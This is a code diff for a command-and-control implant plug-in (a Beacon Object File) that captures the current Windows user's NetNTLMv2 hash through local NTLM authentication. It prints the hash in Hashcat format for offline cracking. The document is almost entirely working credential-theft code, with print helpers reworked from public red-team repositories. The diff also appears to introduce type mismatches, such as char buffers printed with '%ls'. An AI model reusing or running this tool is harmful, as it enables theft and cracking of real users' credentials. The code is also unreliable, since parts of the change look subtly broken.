@@ -10,6 +10,15 @@
 #pragma comment(lib,"Secur32")
 
 #define MSV1_0_CHALLENGE_LENGTH 8
+#ifndef bufsize
+#define bufsize 8192
+#endif
+char *output = 0;  
+WORD currentoutsize = 0;
+HANDLE trash = NULL; 
+int bofstart();
+void internal_printf(const char* format, ...);
+void printoutput(BOOL done);
 
 //
 //Most of the code originates from: https://github.com/leechristensen/GetNTLMChallenge/tree/master
@@ -175,94 +184,69 @@ typedef struct _KEY_BLOB {
 NTSTATUS WINAPI SystemFunction007(PUNICODE_STRING string, LPBYTE hash);
 
 
-//START beacon print function. Code originates from: https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Psx/SOURCE/Psx.c
-HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
-	HRESULT hr = S_FALSE;
-	va_list argList;
-	DWORD dwWritten = 0;
 
-	if (g_lpStream <= (LPSTREAM)1) {
-		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &g_lpStream);
-		if (FAILED(hr)) {
-			return hr;
-		}
-	}
 
-	if (g_lpwPrintBuffer <= (LPWSTR)1) { 
-		g_lpwPrintBuffer = (LPWSTR)MSVCRT$calloc(MAX_STRING, sizeof(WCHAR));
-		if (g_lpwPrintBuffer == NULL) {
-			hr = E_FAIL;
-			goto CleanUp;
-		}
-	}
 
-	va_start(argList, lpwFormat);
-	if (!MSVCRT$_vsnwprintf_s(g_lpwPrintBuffer, MAX_STRING, MAX_STRING -1, lpwFormat, argList)) {
-		hr = E_FAIL;
-		goto CleanUp;
-	}
-
-	if (g_lpStream != NULL) {
-		if (FAILED(hr = g_lpStream->lpVtbl->Write(g_lpStream, g_lpwPrintBuffer, (ULONG)MSVCRT$wcslen(g_lpwPrintBuffer) * sizeof(WCHAR), &dwWritten))) {
-			goto CleanUp;
-		}
-	}
-
-	hr = S_OK;
-
-CleanUp:
-
-	if (g_lpwPrintBuffer != NULL) {
-		MSVCRT$memset(g_lpwPrintBuffer, 0, MAX_STRING * sizeof(WCHAR)); 
-	}
-
-	va_end(argList);
-	return hr;
+//START TrustedSec BOF print code: https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/common/base.c
+int bofstart() {   
+    output = (char*)MSVCRT$calloc(bufsize, 1);
+    currentoutsize = 0;
+    return 1;
 }
 
-VOID BeaconOutputStreamW() {
-	STATSTG ssStreamData = { 0 };
-	SIZE_T cbSize = 0;
-	ULONG cbRead = 0;
-	LARGE_INTEGER pos;
-	LPWSTR lpwOutput = NULL;
-
-	if (FAILED(g_lpStream->lpVtbl->Stat(g_lpStream, &ssStreamData, STATFLAG_NONAME))) {
-		return;
-	}
-
-	cbSize = ssStreamData.cbSize.LowPart;
-	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
-	if (lpwOutput != NULL) {
-		pos.QuadPart = 0;
-		if (FAILED(g_lpStream->lpVtbl->Seek(g_lpStream, pos, STREAM_SEEK_SET, NULL))) {
-			goto CleanUp;
-		}
-
-		if (FAILED(g_lpStream->lpVtbl->Read(g_lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
-			goto CleanUp;
-		}
-
-		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
-	}
-
-CleanUp:
-	if (g_lpStream != NULL) {
-		g_lpStream->lpVtbl->Release(g_lpStream);
-		g_lpStream = NULL;
-	}
-
-	if (g_lpwPrintBuffer != NULL) {
-		MSVCRT$free(g_lpwPrintBuffer); 
-		g_lpwPrintBuffer = NULL;
-	}
-
-	if (lpwOutput != NULL) {
-		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
-	}
-	return;
+void internal_printf(const char* format, ...){
+    int buffersize = 0;
+    int transfersize = 0;
+    char * curloc = NULL;
+    char* intBuffer = NULL;
+    va_list args;
+    va_start(args, format);
+    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
+    va_end(args);
+    
+    if (buffersize == -1) return;
+    
+    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
+	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
+    va_start(args, format);
+    MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
+    va_end(args);
+    if(buffersize + currentoutsize < bufsize) 
+    {
+        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
+        currentoutsize += buffersize;
+    } else {
+        curloc = intBuffer;
+        while(buffersize > 0)
+        {
+            transfersize = bufsize - currentoutsize;
+            if(buffersize < transfersize) 
+            {
+                transfersize = buffersize;
+            }
+            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
+            currentoutsize += transfersize;
+            if(currentoutsize == bufsize)
+            {
+                printoutput(FALSE); 
+            }
+            MSVCRT$memset(transferBuffer, 0, transfersize); 
+            curloc += transfersize; 
+            buffersize -= transfersize;
+        }
+    }
+	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
+	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
 }
-//END beacon print function
+
+void printoutput(BOOL done) {
+    char * msg = NULL;
+    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
+    currentoutsize = 0;
+    MSVCRT$memset(output, 0, bufsize);
+    if(done) {MSVCRT$free(output); output=NULL;}
+}
+//END TrustedSec BOF print code.
 
 
 void SetPredefinedChallenge(UCHAR challenge[MSV1_0_CHALLENGE_LENGTH]) {
@@ -272,9 +256,9 @@ void SetPredefinedChallenge(UCHAR challenge[MSV1_0_CHALLENGE_LENGTH]) {
 
 
 BOOL GetNTLMChallengeAndResponse() {
-	WCHAR szDomainName[256 + 1] = L"";
-	WCHAR szUserName[256 + 1] = L"";
-	wchar_t ntlmsp_name[] = L"NTLM";
+	CHAR szDomainName[256 + 1] = "";
+	CHAR szUserName[256 + 1] = "";
+	char ntlmsp_name[] = "NTLM";
 	UCHAR bServerChallenge[MSV1_0_CHALLENGE_LENGTH];
 	PNTLMv2_RESPONSE pNtChallengeResponse = NULL;
 	PNTLMv2_CLIENT_CHALLENGE pClientChallenge = NULL;
@@ -285,13 +269,11 @@ BOOL GetNTLMChallengeAndResponse() {
 	TimeStamp InboundLifetime;
 	TimeStamp OutboundLifetime;
 
-	DWORD status = SECUR32$AcquireCredentialsHandleW(NULL, ntlmsp_name, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hOutboundCred, &OutboundLifetime);
-
+	DWORD status = SECUR32$AcquireCredentialsHandleA(NULL, ntlmsp_name, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hOutboundCred, &OutboundLifetime);
 	if (status != 0)
 		return FALSE;
 
-	status = SECUR32$AcquireCredentialsHandleW(NULL, ntlmsp_name, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hInboundCred, &InboundLifetime);
-
+	status = SECUR32$AcquireCredentialsHandleA(NULL, ntlmsp_name, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hInboundCred, &InboundLifetime);
 	if (status != 0)
 		return FALSE;
 
@@ -331,7 +313,7 @@ BOOL GetNTLMChallengeAndResponse() {
 	ULONG InboundContextAttributes = 0;
 
 	// Setup the client security context
-	status = SECUR32$InitializeSecurityContextW(&hOutboundCred, NULL, NULL, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, 0, SECURITY_NATIVE_DREP, NULL, 0, &OutboundContextHandle, &OutboundNegotiateBuffDesc, &OutboundContextAttributes, &OutboundLifetime);
+	status = SECUR32$InitializeSecurityContextA(&hOutboundCred, NULL, NULL, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, 0, SECURITY_NATIVE_DREP, NULL, 0, &OutboundContextHandle, &OutboundNegotiateBuffDesc, &OutboundContextAttributes, &OutboundLifetime);
 	if (status != SEC_I_CONTINUE_NEEDED) return FALSE;
 
 	NEGOTIATE_MESSAGE* negotiate = (NEGOTIATE_MESSAGE*)OutboundNegotiateBuffDesc.pBuffers[0].pvBuffer;
@@ -348,19 +330,19 @@ BOOL GetNTLMChallengeAndResponse() {
 	// when local call, windows remove the ntlm response
 	challenge->NegotiateFlags &= ~NTLMSSP_NEGOTIATE_LOCAL_CALL;
 
-	status = SECUR32$InitializeSecurityContextW(&hOutboundCred, &OutboundContextHandle, NULL, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, 0, SECURITY_NATIVE_DREP, &OutboundChallengeBuffDesc, 0, &OutboundContextHandle, &OutboundAuthenticateBuffDesc, &OutboundContextAttributes, &OutboundLifetime);
+	status = SECUR32$InitializeSecurityContextA(&hOutboundCred, &OutboundContextHandle, NULL, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, 0, SECURITY_NATIVE_DREP, &OutboundChallengeBuffDesc, 0, &OutboundContextHandle, &OutboundAuthenticateBuffDesc, &OutboundContextAttributes, &OutboundLifetime);
 	if (status != 0) return FALSE;
 
 	AUTHENTICATE_MESSAGE* authenticate = (AUTHENTICATE_MESSAGE*)OutboundAuthenticateBuffDesc.pBuffers[0].pvBuffer;
 
 	// Get domain name
 	MSVCRT$memcpy(szDomainName, ((PBYTE)authenticate + authenticate->DomainName.Offset), authenticate->DomainName.Length);
-	szDomainName[authenticate->DomainName.Length / 2] = 0;
+    szDomainName[authenticate->DomainName.Length] = 0;
 
 	// Get username
-	MSVCRT$memcpy(szUserName, ((PBYTE)authenticate + authenticate->UserName.Offset), authenticate->UserName.Length);
-	szUserName[authenticate->UserName.Length / 2] = 0;
-
+    MSVCRT$memcpy(szUserName, ((PBYTE)authenticate + authenticate->UserName.Offset), authenticate->UserName.Length);
+    szUserName[authenticate->UserName.Length] = 0;
+	
 	// Get the Server challenge
 	MSVCRT$memcpy(bServerChallenge, challenge->Challenge, MSV1_0_CHALLENGE_LENGTH);
 
@@ -371,39 +353,41 @@ BOOL GetNTLMChallengeAndResponse() {
 	dwClientChallengeSize = authenticate->NtChallengeResponse.Length - 16;
 
 	// Print output in Hashcat Format: username:domain:ServerChallenge:response:blob
-	BeaconPrintToStreamW(L"[+] Successful NetNTLMv2 hash capture:\n");
-	BeaconPrintToStreamW(L"========================================\n\n");
-	BeaconPrintToStreamW(L"%s::%s:", szUserName, szDomainName);
+    internal_printf("[+] Successful NetNTLMv2 hash capture:\n");
+    internal_printf("========================================\n\n");
+    internal_printf("%ls::%ls:", szUserName, szDomainName);
+	
+	    // ServerChallenge
+    for (int i = 0; i < sizeof(bServerChallenge); i++) {
+        internal_printf("%02x", bServerChallenge[i]);
+    }
+    internal_printf(":");
 
-	// ServerChallenge
-	for (int i = 0; i < sizeof(bServerChallenge); i++) {
-		BeaconPrintToStreamW(L"%02x", bServerChallenge[i]);
-	}
-	BeaconPrintToStreamW(L":");
+    // response
+    for (int i = 0; i < sizeof(pNtChallengeResponse->Response); i++) {
+        internal_printf("%02x", pNtChallengeResponse->Response[i]);
+    }
+    internal_printf(":");
 
-	// response
-	for (int i = 0; i < sizeof(pNtChallengeResponse->Response); i++) {
-		BeaconPrintToStreamW(L"%02x", pNtChallengeResponse->Response[i]);
-	}
-	BeaconPrintToStreamW(L":");
-
-	// blob
-	for (DWORD i = 0; i < dwClientChallengeSize; i++) {
-		BeaconPrintToStreamW(L"%02x", *((PBYTE)(&(pNtChallengeResponse->Challenge)) + i));  // 16 
-	}
-	BeaconPrintToStreamW(L"\n");
-
+    // blob
+    for (DWORD i = 0; i < dwClientChallengeSize; i++) {
+        internal_printf("%02x", *((PBYTE)(&(pNtChallengeResponse->Challenge)) + i));  // 16 
+    }
+    internal_printf("\n");
+	
 	return TRUE;
 }
 
 
 int go() {
+	if(!bofstart()) return;
+	
 	BOOL result = GetNTLMChallengeAndResponse();
 	
 	if (result) {
-		BeaconOutputStreamW();
+		printoutput(TRUE);
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT,"\n[-] Failed to capture NetNTLM hash.\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"\nFailed to capture NetNTLM hash.\n");
     }
 	
 	return 0;
